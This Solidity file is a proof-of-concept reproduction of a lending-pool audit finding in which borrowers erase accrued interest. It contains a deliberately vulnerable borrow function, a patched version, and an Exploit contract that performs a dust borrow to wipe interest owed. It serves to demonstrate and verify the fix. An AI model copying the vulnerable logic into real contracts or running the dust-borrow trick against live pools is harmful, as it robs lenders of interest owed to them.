// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of RegnumAurum finding 63402 (H-02):
// "Borrowers can avoid paying interest for lenders".
//
// LendingPool.borrow() mints debt through the DebtToken, which correctly returns
// BOTH the new principal (underlyingAmount == amount) AND the interest accrued on
// the borrower's existing debt (a separate return value). But borrow() then:
//   1. resets  position.positionIndex = reserve.usageIndex   (to the CURRENT index)
//   2. adds ONLY the principal:  position.rawDebtBalance += underlyingAmount
// It never folds the accrued interest into rawDebtBalance. The tracked debt is
//   _positionScaledDebt = rawDebtBalance * usageIndex / positionIndex
// and because positionIndex was just reset to usageIndex, the usageIndex/positionIndex
// ratio collapses to 1, so ALL previously-accrued interest is wiped from the
// borrower's tracked debt. A borrower who has accrued interest can borrow (and
// immediately repay) a dust amount to reset positionIndex and erase 100% of the
// interest they owe — lenders never receive it.
//
// Harm: the accrued interest (A*I1/I0 - A) that vanishes from the borrower's
// tracked debt. Measured as (fixed tracked debt) - (buggy tracked debt) after an
// identical dust borrow; recorded on a UNPAID-crvUSD marker to the SINK.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double used for crvUSD (payout asset) and the harm marker.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful minimal double for the scaled DebtToken. It tracks the borrower's
///      debt in underlying and the usageIndex at last interaction, so the accrued
///      interest (balanceIncrease) is computed CORRECTLY and returned SEPARATELY
///      from the newly-borrowed principal — exactly as the finding describes
///      ("Debt token will mint the interest correctly ... this increase is returned
///      as [a separate] parameter in mint"). This is the correct boundary; the bug
///      is in the LendingPool that ignores the returned interest.
contract DebtToken {
    mapping(address => uint256) public debtBalance; // current debt in underlying
    mapping(address => uint256) public debtIndex;   // usageIndex at last update

    /// @return scaledMinted   scaled amount minted (unused by the vulnerable pool)
    /// @return underlyingAmount the new principal == `amount`
    /// @return balanceIncrease the interest accrued on the existing debt (IGNORED by bug)
    /// @return newDebtBalance  the borrower's total debt after this mint
    function mint(address, address onBehalfOf, uint256 amount, uint256 index, bytes calldata)
        external
        returns (uint256 scaledMinted, uint256 underlyingAmount, uint256 balanceIncrease, uint256 newDebtBalance)
    {
        uint256 prevDebt = debtBalance[onBehalfOf];
        uint256 prevIndex = debtIndex[onBehalfOf];
        uint256 accruedDebt = prevDebt;
        balanceIncrease = 0;
        if (prevDebt != 0 && prevIndex != 0) {
            accruedDebt = prevDebt * index / prevIndex;
            balanceIncrease = accruedDebt - prevDebt;
        }
        debtBalance[onBehalfOf] = accruedDebt + amount;
        debtIndex[onBehalfOf] = index;
        return (amount, amount, balanceIncrease, debtBalance[onBehalfOf]);
    }
}

/// @dev Faithful minimal double for the RToken: custodies the reserve's crvUSD and
///      pays the borrowed amount out on borrow. Not the vulnerable boundary.
contract RToken {
    MiniToken public asset;

    constructor(MiniToken _asset) {
        asset = _asset;
    }

    function transferAsset(address to, uint256 amount) external {
        asset.transfer(to, amount);
    }
}

struct Reserve {
    address reserveDebtTokenAddress;
    address reserveRTokenAddress;
    uint256 usageIndex;
}

struct Position {
    uint256 positionIndex;
    uint256 rawDebtBalance;
}

interface IDebtToken {
    function mint(address user, address onBehalfOf, uint256 amount, uint256 index, bytes calldata data)
        external
        returns (uint256, uint256, uint256, uint256);
}

interface IRToken {
    function transferAsset(address to, uint256 amount) external;
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the borrow tail is inlined VERBATIM from the finding.
// ─────────────────────────────────────────────────────────────────────────────
contract LendingPool {
    Reserve public reserve;
    mapping(address => Position) public positions;

    constructor(address debtToken, address rToken, uint256 initialIndex) {
        reserve.reserveDebtTokenAddress = debtToken;
        reserve.reserveRTokenAddress = rToken;
        reserve.usageIndex = initialIndex;
    }

    /// @notice Test hook: simulate interest accrual by bumping the reserve usage index.
    function accrueInterest(uint256 newUsageIndex) external {
        reserve.usageIndex = newUsageIndex;
    }

    function borrow(uint256 amount, address adapter, bytes memory data) external {
        Position storage position = positions[msg.sender];

        (, uint256 underlyingAmount, , ) = IDebtToken(reserve.reserveDebtTokenAddress).mint(msg.sender, msg.sender, amount, reserve.usageIndex, abi.encode(adapter, data));

        // We need to update the position index of the user
        position.positionIndex = reserve.usageIndex;

        // Transfer borrowed amount to user
        IRToken(reserve.reserveRTokenAddress).transferAsset(msg.sender, amount);

        position.rawDebtBalance += underlyingAmount; // @> only the new principal is added; the accrued interest returned by mint is ignored while positionIndex is reset to usageIndex, collapsing usageIndex/positionIndex to ~1 and wiping all prior interest
    }

    function positionScaledDebt(address user) external view returns (uint256) {
        return _positionScaledDebt(user);
    }

    function _positionScaledDebt(address user) internal view returns (uint256) {
        Position storage position = positions[user];
        if (position.positionIndex == 0) return 0;
        return position.rawDebtBalance * reserve.usageIndex / position.positionIndex; // formula from the finding
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract — applies the finding's recommendation: fold the accrued
// interest into rawDebtBalance too, so resetting positionIndex does not erase it.
// ─────────────────────────────────────────────────────────────────────────────
contract LendingPoolFixed {
    Reserve public reserve;
    mapping(address => Position) public positions;

    constructor(address debtToken, address rToken, uint256 initialIndex) {
        reserve.reserveDebtTokenAddress = debtToken;
        reserve.reserveRTokenAddress = rToken;
        reserve.usageIndex = initialIndex;
    }

    function accrueInterest(uint256 newUsageIndex) external {
        reserve.usageIndex = newUsageIndex;
    }

    function borrow(uint256 amount, address adapter, bytes memory data) external {
        Position storage position = positions[msg.sender];

        (, uint256 underlyingAmount, uint256 balanceIncrease, ) = IDebtToken(reserve.reserveDebtTokenAddress).mint(msg.sender, msg.sender, amount, reserve.usageIndex, abi.encode(adapter, data));

        position.positionIndex = reserve.usageIndex;

        IRToken(reserve.reserveRTokenAddress).transferAsset(msg.sender, amount);

        // FIX: add the accrued interest to rawDebtBalance too (finding recommendation).
        position.rawDebtBalance += underlyingAmount + balanceIncrease;
    }

    function positionScaledDebt(address user) external view returns (uint256) {
        return _positionScaledDebt(user);
    }

    function _positionScaledDebt(address user) internal view returns (uint256) {
        Position storage position = positions[user];
        if (position.positionIndex == 0) return 0;
        return position.rawDebtBalance * reserve.usageIndex / position.positionIndex;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: borrow 1000 crvUSD at index I0, accrue 5% interest (index -> I1),
// then borrow 20 crvUSD dust. The dust borrow resets positionIndex to I1 and adds
// only the 20 principal, so the 50 crvUSD of accrued interest is erased from the
// borrower's tracked debt. The identical sequence against the FIXED pool retains it.
// The erased interest (loss to lenders) is recorded on the UNPAID-crvUSD marker.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant INDEX0 = 1e18;    // usage index at first borrow
    uint256 internal constant INDEX1 = 105e16;  // usage index after 5% interest accrual (1.05e18)
    uint256 internal constant A = 1000 ether;   // initial borrow
    uint256 internal constant B = 20 ether;     // dust borrow that resets positionIndex

    uint256 public buggyDebtBeforeDust;   // 1050e18 (principal + interest, correctly shown)
    uint256 public buggyDebtAfterDust;    // 1020e18 (interest erased by the dust borrow)
    uint256 public fixedDebtAfterDust;    // 1070e18 (interest retained, principal + dust)
    uint256 public erasedInterest;        // 50e18   (the accrued interest that vanishes)
    uint256 public sinkMarkerBalance;
    address public poolAddr;
    address public fixedPoolAddr;
    address public markerAddr;

    function run() external payable {
        // --- deploy every helper unconditionally, fixed order (marker LAST) ---
        MiniToken crvUSD = new MiniToken("crvUSD", "crvUSD");                         // 1
        DebtToken debt = new DebtToken();                                            // 2
        RToken rToken = new RToken(crvUSD);                                          // 3
        LendingPool pool = new LendingPool(address(debt), address(rToken), INDEX0);  // 4

        MiniToken crvUSDf = new MiniToken("crvUSD", "crvUSD");                        // 5
        DebtToken debtf = new DebtToken();                                           // 6
        RToken rTokenf = new RToken(crvUSDf);                                        // 7
        LendingPoolFixed poolf =
            new LendingPoolFixed(address(debtf), address(rTokenf), INDEX0);          // 8

        MiniToken marker = new MiniToken("UNPAID-crvUSD", "UNPAID-crvUSD");           // 9 (LAST)

        poolAddr = address(pool);
        fixedPoolAddr = address(poolf);
        markerAddr = address(marker);

        // fund the RTokens so transferAsset(borrower, amount) succeeds
        crvUSD.mint(address(rToken), 1_000_000 ether);
        crvUSDf.mint(address(rTokenf), 1_000_000 ether);

        // ===== BUGGY pool =====
        pool.borrow(A, address(0), "");                         // borrow 1000 @ I0
        pool.accrueInterest(INDEX1);                            // 5% interest accrues
        buggyDebtBeforeDust = pool.positionScaledDebt(address(this)); // 1050e18
        pool.borrow(B, address(0), "");                         // dust borrow resets positionIndex
        buggyDebtAfterDust = pool.positionScaledDebt(address(this));  // 1020e18 (interest gone)

        // ===== FIXED pool (negative control), identical sequence =====
        poolf.borrow(A, address(0), "");
        poolf.accrueInterest(INDEX1);
        poolf.borrow(B, address(0), "");
        fixedDebtAfterDust = poolf.positionScaledDebt(address(this)); // 1070e18 (interest kept)

        // --- harm: accrued interest erased from the borrower's tracked debt ---
        erasedInterest = fixedDebtAfterDust - buggyDebtAfterDust; // 50e18
        require(erasedInterest > 0, "no interest erased");
        // the borrower's tracked debt collapsed below (prior debt + new dust):
        require(buggyDebtAfterDust < buggyDebtBeforeDust + B, "debt did not collapse");

        marker.mint(SINK, erasedInterest);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
